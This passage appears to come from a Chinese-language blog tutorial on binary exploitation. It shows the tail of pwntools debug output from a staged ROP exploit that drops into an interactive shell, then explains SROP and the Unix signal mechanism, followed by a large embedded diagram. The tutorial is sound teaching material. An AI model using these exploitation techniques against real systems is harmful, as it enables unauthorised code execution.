│ZONl│lsKZ│vSHn│87IG│</span><br><span class=\"line\">    00000050  69 49 52 6c  50 44 38 67  45 77 75 6c  72 47 6f 67  │iIRl│PD8g│Ewul│rGog│</span><br><span class=\"line\">    00000060  55 41 52 4f                                         │UARO││</span><br><span class=\"line\">    00000064</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">$ ls</span><br><span class=\"line\">[DEBUG] Sent 0x3 bytes:</span><br><span class=\"line\">    &#x27;ls\\n&#x27;</span><br><span class=\"line\">[DEBUG] Received 0x8d bytes:</span><br><span class=\"line\">    &#x27;core\\t     main    roptool.py   roputils.pyc\\tstage2.py  stage4.py  stage6.py\\n&#x27;</span><br><span class=\"line\">    &#x27;__init__.py  main.c  roputils.py  stage1.py\\tstage3.py  stage5.py\\n&#x27;</span><br><span class=\"line\">core         main    roptool.py   roputils.pyc    stage2.py  stage4.py  stage6.py</span><br><span class=\"line\">__init__.py  main.c  roputils.py  stage1.py    stage3.py  stage5.py</span><br></pre></td></tr></table></figure>\n\n<p><strong>SROP</strong></p>\n<p>SROP(Sigreturn Oriented Programming)于2014年被Vrije Universiteit Amsterdam的Erik Bosman提出，其相关研究<strong>Framing Signals — A Return to Portable Shellcode</strong>发表在安全顶级会SP2014上，被评选为当年的Best Student Papers。</p>\n<p><strong>signal机制</strong></p>\n<p>signal机制是类unix系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用kill来发送软中断信号。一般来说，信号机制常见的步骤如下图所示</p>\n<p><img src=\"data:image/png;base64,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IENvcmUgNS40LjAiPgogICA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczpleGlmPSJodHRwOi8vbnMuYWRvYmUuY29tL2V4aWYvMS4wLyI+CiAgICAgICAgIDxleGlmOlBpeGVsWERpbWVuc2lvbj44MTY8L2V4aWY6UGl4ZWxYRGltZW5zaW9uPgogICAgICAgICA8ZXhpZjpQaXhlbFlEaW1lbnNpb24+MjY2PC9leGlmOlBpeGVsWURpbWVuc2lvbj4KICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CiAgIDwvcmRmOlJERj4KPC94OnhtcG1ldGE+CkXEHR8AAEAASURBVHgB7J0HmFxV+cZPNtn0QgihRAktFEPvRXqR3hERUDqIglQBAZWOSAmggAhSpEn5UwQpoQhIlRo6oYTQQi8JqZtk/t/vu3sms7Mz2zKzO3fm/Z5ndu7ce8p33js797znK6dbxiRIhIAQEAJCQAgIASEgBISAEBACKUCgLgU6SkUhIASEgBAQAkJACAgBISAEhIAjIAKjL4IQEAJCQAgIASEgBISAEBACqUFABCY1t0qKCgEhIASEgBAQAkJACAgBISACo++AEBACQkAICAEhIASEgBAQAqlBQAQmNbdKigoBISAEhIAQEAJCQAgIASEgAqPvgBAQAkJACAgBISAEhIAQEAKpQUAEJjW3SooKASEgBISAEBACQkAICAEhIAKj74AQEAJCQAgIASEgBISAEBACqUFABCY1t0qKCgEhIASEgBAQAkJACAgBISACo++AEBACQkAICAEhIASEgBAQAqlBQAQmNbdKigoBISAEhIAQEAJCQAgIASEgAqPvgBAQAkJACAgBISAEhIAQEAKpQUAEJjW3SooKASEgBISAEBACQkAICAEhIAKj74AQEAJCQAgIASEgBISAEBACqUFABCY1t0qKCgEhIASEgBAQAkJACAgBISACo++AEBACQkAICAEhIASEgBAQAqlBQAQmNbdKigoBISAEhIAQEAJCQAgIASEgAqPvgBAQAkJACAgBISAEhIAQEAKpQUAEJjW3SooK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